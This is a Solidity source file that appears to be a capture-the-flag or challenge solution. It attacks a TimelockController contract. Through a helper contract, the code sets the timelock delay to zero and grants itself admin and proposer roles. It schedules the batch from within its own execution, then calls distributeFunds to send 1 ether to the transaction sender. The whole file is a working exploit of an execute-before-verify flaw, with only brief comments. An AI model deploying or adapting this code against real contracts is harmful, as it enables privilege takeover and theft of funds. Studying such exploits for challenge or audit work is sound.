pragma solidity 0.8.4;

import "./Setup.sol";

contract Helper {

    function attack(address inst, address exp) public {
        
        TimelockController tc = TimelockController(payable(inst));

        address[] memory batch1_addresses = new address[](4);
        uint256[] memory batch1_values = new uint256[](4);
        bytes[] memory batch1_calldata = new bytes[](4);

        tc.grantRole(keccak256("PROPOSER_ROLE"), address(this));


        //Batch 1
        //First call to updateDelay
        batch1_addresses[0] = address(inst);
        batch1_values[0] = 0;
        batch1_calldata[0] = abi.encodeWithSignature("updateDelay(uint256)", uint256(0));

        //Then call to grantrole
        batch1_addresses[1] = address(inst);
        batch1_values[1] = 0;
        batch1_calldata[1] = abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("TIMELOCK_ADMIN_ROLE"), address(this));

        batch1_addresses[2] = address(inst);
        batch1_values[2] = 0;
        batch1_calldata[2] = abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("TIMELOCK_ADMIN_ROLE"), address(exp));

        //Then call to relay the attack to the contract
        batch1_addresses[3] = address(this);
        batch1_values[3] = 0;
        batch1_calldata[3] = abi.encodeWithSignature("attack(address,address)", address(inst), address(exp));

        tc.scheduleBatch(batch1_addresses, batch1_values, batch1_calldata, 0, 0, 0);

    }

}

contract chabooAttacker {

    address[] batch1_addresses;
    uint256[] batch1_values;
    bytes[] batch1_calldata;

    address[] batch2_addresses;
    uint256[] batch2_values;
    bytes[] batch2_calldata;

    constructor(address inst) payable {
        Helper h = new Helper();

        //Batch 1
        //First call to updateDelay
        batch1_addresses.push(address(inst));
        batch1_values.push(0);
        batch1_calldata.push(abi.encodeWithSignature("updateDelay(uint256)", uint256(0)));

        //Then call to grantrole
        batch1_addresses.push(address(inst));
        batch1_values.push(0);
        batch1_calldata.push(abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("TIMELOCK_ADMIN_ROLE"), address(h)));

        batch1_addresses.push(address(inst));
        batch1_values.push(0);
        batch1_calldata.push(abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("TIMELOCK_ADMIN_ROLE"), address(this)));

        //Then call to relay the attack to the contract
        batch1_addresses.push(address(h));
        batch1_values.push(0);
        batch1_calldata.push(abi.encodeWithSignature("attack(address,address)", address(inst), address(this)));

        //Call
        TimelockController(payable(inst)).executeBatch(batch1_addresses, batch1_values, batch1_calldata, 0, 0);
        TimelockController(payable(inst)).grantRole(keccak256("PROPOSER_ROLE"), address(this));

        address target = address(inst);
        uint256 value = 0;
        bytes memory call_data = abi.encodeWithSignature("distributeFunds(address,uint256)", address(tx.origin), 1 ether);

        TimelockController(payable(inst)).schedule(target, value, call_data, 0, 0, 0);
        TimelockController(payable(inst)).execute(target, value, call_data, 0, 0);

    }

    receive() external payable { }

}